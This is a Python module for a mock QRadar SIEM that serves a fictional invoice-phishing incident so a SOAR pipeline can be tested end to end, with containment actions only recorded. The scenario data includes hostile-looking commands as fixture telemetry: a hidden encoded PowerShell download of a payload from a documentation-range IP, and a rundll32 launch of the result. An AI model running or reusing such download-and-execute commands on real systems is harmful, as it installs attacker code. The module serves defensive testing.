"""Private pinned-scenario mode — ``SIEMULATOR_MODE=pinned``.

A deployment in this mode serves exactly the hand-written scenarios named in
``SIEMULATOR_PINNED_SCENARIOS`` and nothing else. It exists for a recording
or a live end-to-end test where the incident a SOAR creates must be
predictable, contain no real infrastructure and no real people, and appear
exactly once.

What the mode guarantees:

- ``GET <qradar prefix>/api/siem/offenses`` returns ONLY the pinned
  scenarios, whatever the query string says (``scenarios``, ``extras``,
  ``labels`` and ``Range`` are ignored). It never falls back to the public
  scenario library or the random templates.
- Each pinned offence is served ONCE per process lifetime, so a poller on a
  short cron creates one incident, not one per poll. Set
  ``SIEMULATOR_PINNED_REPEAT=true`` to serve them on every poll instead.
  ``GET .../offenses/{id}`` always answers for a pinned id.
- Only an explicitly set, non-default ``SIEMULATOR_QRADAR_TOKEN`` opens it.
- An unknown or empty ``SIEMULATOR_PINNED_SCENARIOS`` serves ``[]`` and says
  why in ``X-Mock-Pinned``; it never guesses.
- Every IPv4 address in a pinnable scenario is in an RFC 5737 documentation
  range, every hostname ends in ``.example.test``, and no scenario names a
  person (tests/test_pinned_mode.py pins all three).
- Timestamps are re-based at first serve so the newest event is a few minutes
  old (``SIEMULATOR_PINNED_RETIME=false`` keeps the authored times).
- The QRadar actions a SOAR runs back (add a value to a reference set, add an
  offence note) are accepted and only RECORDED in memory, readable back via the
  matching GETs. There is no real QRadar behind them, so an approve→execute
  test exercises the whole path with nothing external to undo.
- ``SIEMULATOR_QRADAR_PREFIX=/`` serves at the root, where SIRP's QRadar app
  scripts call.
- The LogScale, Splunk and vendor-native surfaces, the web UI, sessions,
  fault injection and the scenario listing are not mounted at all.
"""
from __future__ import annotations

import copy
import os
import re
import threading
from datetime import datetime, timedelta, timezone
from typing import Any

from fastapi import APIRouter, FastAPI, HTTPException, Request, Response

from siemulator import __version__
from siemulator.config import MOCK_SOURCE, access_log_enabled, qradar_prefix
from siemulator.corpus import check_private_token

PINNED_ID_BASE = 95_000

# ── Pinnable scenarios ──────────────────────────────────────────────
#
# Hand-written for SIRP's own showcase / approve→execute tests. Rules for
# anything added here (enforced by tests/test_pinned_mode.py):
#   * IPv4 only from 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24 (RFC 5737)
#   * hostnames and mail domains only under .example.test (RFC 2606/6761)
#   * accounts and mailboxes are roles or services, never a person's name
#   * hashes are sha256("siemulator-showcase/<file name>") — fictional, so
#     enrichment honestly returns "unknown" rather than a borrowed verdict
#
# Times are authored on 2026-01-01 and re-based at serve time.

_PHISH_1: dict[str, Any] = {
    "source": "QRadar correlation (Mail Gateway + Defender for Endpoint + Edge Firewall)",
    "event_type": "CorrelatedOffence",
    "timestamp": "2026-01-01T09:00:00Z",
    "severity": "High",
    "confidence": 80,
    "qradar_categories": ["Phishing", "Malware", "Command and Control"],
    "alert": {
        "name": "Invoice phishing led to script execution and outbound beaconing on FIN-WS-014",
        "description": (
            "A shared accounts-payable mailbox received an 'overdue invoice' email from a "
            "look-alike billing domain. The attachment was opened on FIN-WS-014, a script "
            "launched an encoded PowerShell download, a DLL was loaded with rundll32, and the "
            "host then contacted an external address every 60 seconds over HTTPS."
        ),
    },
    "email": {
        "gateway": "mail-gw-01.corp.example.test",
        "message_id": "<20260101085412.4f1c@invoices-portal.example.test>",
        "from": "billing@invoices-portal.example.test",
        "reply_to": "ar-desk@payments-update.example.test",
        "to": ["ap-invoices@finance.example.test"],
        "subject": "Overdue invoice INV-20431 - action required",
        "sender_ip": "198.51.100.23",
        "received": "2026-01-01T08:54:12Z",
        "spf": "softfail",
        "dkim": "none",
        "dmarc": "fail",
        "verdict": "delivered",
        "attachments": [{
            "name": "INV-20431.zip",
            "sha256": "c03e11a0b04dad871cd4e7e5f522394f87cb926e89138c85681e4f4d5a6f7f22",
            "contains": ["INV-20431.js"],
        }],
        "urls": ["https://docs-share.example.test/s/INV-20431"],
    },
    "device": {
        "hostname": "FIN-WS-014.corp.example.test",
        "ip": "192.0.2.14",
        "os": "Windows 11 23H2",
        "department": "Finance",
        "account": "CORP\\ap-clerk-01",
        "account_type": "shared role account",
    },
    "process_chain": [
        {"time": "2026-01-01T08:57:40Z", "process": "outlook.exe", "action": "saved attachment INV-20431.zip"},
        {"time": "2026-01-01T08:58:05Z", "process": "explorer.exe", "action": "extracted INV-20431.js"},
        {"time": "2026-01-01T08:58:09Z", "process": "wscript.exe",
         "command_line": "wscript.exe C:\\Users\\ap-clerk-01\\Downloads\\INV-20431\\INV-20431.js",
         "sha256": "1428bc237d873cd6ee6bba32578df928188d541487b1e58ee6a3846cd6c6a094"},
        {"time": "2026-01-01T08:58:11Z", "process": "powershell.exe",
         "parent": "wscript.exe",
         "command_line": "powershell.exe -NoP -W Hidden -Enc <base64 download cradle>",
         "decoded": "IWR http://203.0.113.47/update/stage2.bin -OutFile $env:TEMP\\stage2.dll"},
        {"time": "2026-01-01T08:58:20Z", "process": "rundll32.exe",
         "command_line": "rundll32.exe %TEMP%\\stage2.dll,Start",
         "sha256": "5944acc672eb57dae9737df3e14862d33b3b1fcd6facdc6527f07092ea2b497e"},
    ],
    "network": {
        "source_ip": "192.0.2.14",
        "download": {"url": "http://203.0.113.47/update/stage2.bin", "dst_ip": "203.0.113.47",
                     "dst_port": 80, "bytes_in": 184320},
        "beacon": {"dst_host": "cdn-sync.example.test", "dst_ip": "203.0.113.88", "dst_port": 443,
                   "interval_seconds": 60, "sessions": 17,
                   "first_seen": "2026-01-01T08:58:31Z", "last_seen": "2026-01-01T09:00:00Z"},
        "firewall_action": "allowed",
    },
    "iocs": [
        {"type": "email", "value": "billing@invoices-portal.example.test", "pattern": "sender"},
        {"type": "domain", "value": "invoices-portal.example.test", "pattern": "sender_domain"},
        {"type": "domain", "value": "payments-update.example.test", "pattern": "reply_to_domain"},
        {"type": "ip", "value": "198.51.100.23", "pattern": "sender_ip"},
        {"type": "url", "value": "https://docs-share.example.test/s/INV-20431", "pattern": "email_url"},
        {"type": "url", "value": "http://203.0.113.47/update/stage2.bin", "pattern": "payload_url"},
        {"type": "ip", "value": "203.0.113.47", "pattern": "payload_host"},
        {"type": "domain", "value": "cdn-sync.example.test", "pattern": "c2_domain"},
        {"type": "ip", "value": "203.0.113.88", "pattern": "c2_ip"},
        {"type": "hash_sha256", "value": "c03e11a0b04dad871cd4e7e5f522394f87cb926e89138c85681e4f4d5a6f7f22",
         "pattern": "attachment"},
        {"type": "hash_sha256", "value": "1428bc237d873cd6ee6bba32578df928188d541487b1e58ee6a3846cd6c6a094",
         "pattern": "script"},
        {"type": "hash_sha256", "value": "5944acc672eb57dae9737df3e14862d33b3b1fcd6facdc6527f07092ea2b497e",
         "pattern": "payload"},
        {"type": "ip", "value": "192.0.2.14", "pattern": "internal_source"},
    ],
}

# scenario_id -> (offence_id, offence description, offence_source, raw alert)
PINNABLE: dict[str, tuple[int, str, str, dict]] = {
    "SHOWCASE-PHISH-1": (
        PINNED_ID_BASE + 1,
        "Invoice phishing led to script execution and outbound beaconing on FIN-WS-014",
        "192.0.2.14",
        _PHISH_1,
    ),
}

_SEVERITY = {"Critical": 10, "High": 8, "Medium": 5, "Low": 3, "Info": 1}
_ISO = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$")


def _bool_env(name: str, default: str) -> bool:
    return os.environ.get(name, default).strip().lower() in ("1", "true", "yes", "on")


def pinned_mode() -> bool:
    """True when this process runs as a private pinned-scenario deployment."""
    return os.environ.get("SIEMULATOR_MODE", "").strip().lower() == "pinned"


def pinned_ids() -> tuple[list[str], list[str]]:
    """(known, unknown) scenario ids from ``SIEMULATOR_PINNED_SCENARIOS``."""
    raw = os.environ.get("SIEMULATOR_PINNED_SCENARIOS", "")
    asked = [s.strip() for s in raw.split(",") if s.strip()]
    return [s for s in asked if s in PINNABLE], [s for s in asked if s not in PINNABLE]


def _parse(ts: str) -> datetime:
    return datetime.fromisoformat(ts.replace("Z", "+00:00"))


def _latest(node: Any) -> datetime | None:
    found: list[datetime] = []

    def walk(n: Any) -> None:
        if isinstance(n, dict):
            for v in n.values():
                walk(v)
        elif isinstance(n, list):
            for v in n:
                walk(v)
        elif isinstance(n, str) and _ISO.match(n):
            found.append(_parse(n))

    walk(node)
    return max(found) if found else None


def _shift(node: Any, delta: timedelta) -> Any:
    if isinstance(node, dict):
        return {k: _shift(v, delta) for k, v in node.items()}
    if isinstance(node, list):
        return [_shift(v, delta) for v in node]
    if isinstance(node, str) and _ISO.match(node):
        return (_parse(node) + delta).strftime("%Y-%m-%dT%H:%M:%SZ")
    return node


def retime(raw: dict, now: datetime, lag: timedelta = timedelta(minutes=3)) -> dict:
    """Shift every timestamp so the newest one is ``lag`` before ``now``.
    Relative spacing between events is preserved."""
    newest = _latest(raw)
    if newest is None:
        return copy.deepcopy(raw)
    return _shift(raw, (now - lag) - newest)


def as_qradar_offence(scenario_id: str, now: datetime | None = None) -> dict:
    """A pinnable scenario in the QRadar offence shape the SIRP QRadar ingestion
    script reads (``id``, ``start_time``, ``magnitude``, ``description``), with the
    full narrative in ``_raw_alert`` for downstream analysis. No test metadata,
    no answer key, no expected-verdict fields."""
    offence_id, description, offence_source, raw = PINNABLE[scenario_id]
    if _bool_env("SIEMULATOR_PINNED_RETIME", "true"):
        raw = retime(raw, now or datetime.now(timezone.utc))
    else:
        raw = copy.deepcopy(raw)
    times = sorted(_parse(t) for t in _all_times(raw))
    start_ms = int(times[0].timestamp() * 1000)
    last_ms = int(times[-1].timestamp() * 1000)
    sev = _SEVERITY.get(raw.get("severity", "Medium"), 5)
    return {
        "id": offence_id,
        "offense_id": offence_id,
        "description": description,
        "offense_source": offence_source,
        "offense_type": 0,
        "source_ip": raw.get("network", {}).get("source_ip", offence_source),
        "destination_ip": "",
        "severity": sev,
        "magnitude": sev,
        "credibility": max(1, min(10, int(raw.get("confidence", 60)) // 10)),
        "relevance": 8,
        "status": "OPEN",
        "categories": list(raw.get("qradar_categories") or []),
        "category_count": len(raw.get("qradar_categories") or []),
        "rules": [{"type": "CRE_RULE", "id": offence_id}],
        "start_time": start_ms,
        "start_epochtime": start_ms,
        "first_persisted_time": start_ms,
        "last_persisted_time": last_ms,
        "last_updated_time": last_ms,
        "event_count": len(raw.get("process_chain") or []) + 2,
        "flow_count": int(raw.get("network", {}).get("beacon", {}).get("sessions", 0)) + 1,
        "source_count": 1,
        "username_count": 1,
        "device_count": 3,
        "log_sources": [
            {"type_name": "Mail Gateway", "name": "mail-gw-01", "id": 101, "type_id": 101},
            {"type_name": "Microsoft Defender for Endpoint", "name": "edr", "id": 102, "type_id": 102},
            {"type_name": "Edge Firewall", "name": "fw-edge-01", "id": 103, "type_id": 103},
        ],
        "domain_id": 1,
        "domain_name": "corp.example.test",
        "assigned_to": None,
        "closing_user": None,
        "closing_reason_id": None,
        "close_time": None,
        "inactive": False,
        "protected": False,
        "follow_up": False,
        "_raw_alert": raw,
        "_scenario_id": scenario_id,
        "x-mock-source": MOCK_SOURCE,
    }


def _all_times(node: Any) -> list[str]:
    out: list[str] = []
    if isinstance(node, dict):
        for v in node.values():
            out += _all_times(v)
    elif isinstance(node, list):
        for v in node:
            out += _all_times(v)
    elif isinstance(node, str) and _ISO.match(node):
        out.append(node)
    return out


_SERVED: set[int] = set()
_LOCK = threading.Lock()
# Simulated containment / case actions received (in memory; a restart clears it).
_REFSETS: dict[str, list[dict]] = {}
_NOTES: dict[int, list[dict]] = {}


def reset_served() -> None:
    """Forget what has been served and every simulated action
    (tests; a restart does the same)."""
    with _LOCK:
        _SERVED.clear()
        _REFSETS.clear()
        _NOTES.clear()


def _prefix() -> str:
    """The QRadar prefix; ``/`` (or empty) serves at the root, which is where
    SIRP's QRadar app scripts call (``https://<server>/api/siem/offenses``)."""
    return qradar_prefix().rstrip("/")


def _now_ms() -> int:
    return int(datetime.now(timezone.utc).timestamp() * 1000)


def build_pinned_router() -> APIRouter:
    """The QRadar-shaped surface of a pinned-scenario deployment."""
    router = APIRouter(prefix=_prefix(), tags=["qradar-pinned"])

    @router.get("/")
    @router.get("/api/help")
    @router.get("/api/help/capabilities")
    async def health(response: Response):
        """QRadar help / capabilities. No auth required."""
        response.headers["X-Mock-Source"] = MOCK_SOURCE
        return {"endpoint_categories": ["siem"], "version": "20.0", "x-mock-source": MOCK_SOURCE, "mock": True}

    @router.get("/api/siem/offenses")
    async def list_offenses(request: Request, response: Response):
        """Pinned scenarios only — every query parameter is ignored."""
        check_private_token(request, "pinned")
        known, unknown = pinned_ids()
        response.headers["X-Mock-Source"] = MOCK_SOURCE
        response.headers["X-Mock-Mode"] = "pinned"
        if unknown:
            response.headers["X-Mock-Pinned"] = "unknown:" + ",".join(unknown)
            return []
        if not known:
            response.headers["X-Mock-Pinned"] = "none-configured"
            return []
        repeat = _bool_env("SIEMULATOR_PINNED_REPEAT", "false")
        out = []
        with _LOCK:
            for sid in known:
                oid = PINNABLE[sid][0]
                if repeat or oid not in _SERVED:
                    _SERVED.add(oid)
                    out.append(as_qradar_offence(sid))
        response.headers["X-Mock-Pinned"] = "ok"
        response.headers["X-Mock-Pinned-Returned"] = str(len(out))
        return out

    @router.get("/api/siem/offenses/{offense_id}")
    async def get_offense(offense_id: int, request: Request, response: Response):
        """One pinned offence by id (not subject to the serve-once rule)."""
        check_private_token(request, "pinned")
        known, unknown = pinned_ids()
        response.headers["X-Mock-Source"] = MOCK_SOURCE
        if not unknown:
            for sid in known:
                if PINNABLE[sid][0] == offense_id:
                    return as_qradar_offence(sid)
        raise HTTPException(404, "offense not found")

    # ── Simulated actions ────────────────────────────────────────────
    # The containment / case actions a SOAR runs against QRadar land here
    # and are only RECORDED: there is no real QRadar behind this, so an
    # approve→execute test exercises the full path with nothing to undo.

    @router.post("/api/reference_data/sets/{name}")
    async def add_to_reference_set(name: str, request: Request, response: Response,
                                   value: str = ""):
        """QRadar 'add value to reference set' (e.g. block an IP). Recorded only."""
        check_private_token(request, "pinned")
        if not value:
            raise HTTPException(422, "value is required")
        with _LOCK:
            elements = _REFSETS.setdefault(name, [])
            if value not in [e["value"] for e in elements]:
                elements.append({"value": value, "first_seen": _now_ms(), "source": "reference data api"})
            n = len(elements)
        response.headers["X-Mock-Source"] = MOCK_SOURCE
        response.headers["X-Mock-Simulated-Action"] = "reference_set_add"
        return {"name": name, "element_type": "ALN", "number_of_elements": n,
                "creation_time": _now_ms(), "timeout_type": "FIRST_SEEN",
                "x-mock-source": MOCK_SOURCE, "simulated": True}

    @router.get("/api/reference_data/sets/{name}")
    async def get_reference_set(name: str, request: Request, response: Response):
        """What the simulated actions put in a reference set (evidence for a live test)."""
        check_private_token(request, "pinned")
        with _LOCK:
            elements = list(_REFSETS.get(name, []))
        response.headers["X-Mock-Source"] = MOCK_SOURCE
        return {"name": name, "element_type": "ALN", "number_of_elements": len(elements),
                "data": elements, "x-mock-source": MOCK_SOURCE, "simulated": True}

    @router.post("/api/siem/offenses/{offense_id}/notes")
    async def add_offense_note(offense_id: int, request: Request, response: Response,
                               note_text: str = ""):
        """QRadar 'add note to offence'. Recorded only."""
        check_private_token(request, "pinned")
        known, _ = pinned_ids()
        if offense_id not in {PINNABLE[s][0] for s in known}:
            raise HTTPException(404, "offense not found")
        note = {"id": 0, "note_text": note_text, "create_time": _now_ms(), "username": "API_token: soar"}
        with _LOCK:
            notes = _NOTES.setdefault(offense_id, [])
            note["id"] = len(notes) + 1
            notes.append(note)
        response.headers["X-Mock-Source"] = MOCK_SOURCE
        response.headers["X-Mock-Simulated-Action"] = "offense_note_add"
        return note

    @router.get("/api/siem/offenses/{offense_id}/notes")
    async def list_offense_notes(offense_id: int, request: Request, response: Response):
        check_private_token(request, "pinned")
        with _LOCK:
            notes = list(_NOTES.get(offense_id, []))
        response.headers["X-Mock-Source"] = MOCK_SOURCE
        return notes

    return router


def create_pinned_app() -> FastAPI:
    """App factory for ``SIEMULATOR_MODE=pinned``: the pinned surface and nothing else."""
    app = FastAPI(title="siemulator (pinned)", version=__version__, docs_url=None, redoc_url=None,
                  openapi_url=None)
    known, unknown = pinned_ids()
    meta = {"name": "siemulator", "version": __version__, "mode": "pinned",
            "pinned": known, "unknown": unknown, "x-mock-source": MOCK_SOURCE}

    @app.get("/")
    @app.get("/api/info")
    async def info():
        return meta

    app.include_router(build_pinned_router())
    if access_log_enabled():
        from siemulator.access_log import AccessLogMiddleware
        app.add_middleware(AccessLogMiddleware, bound_prefixes=(_prefix() or "/",))
    return app
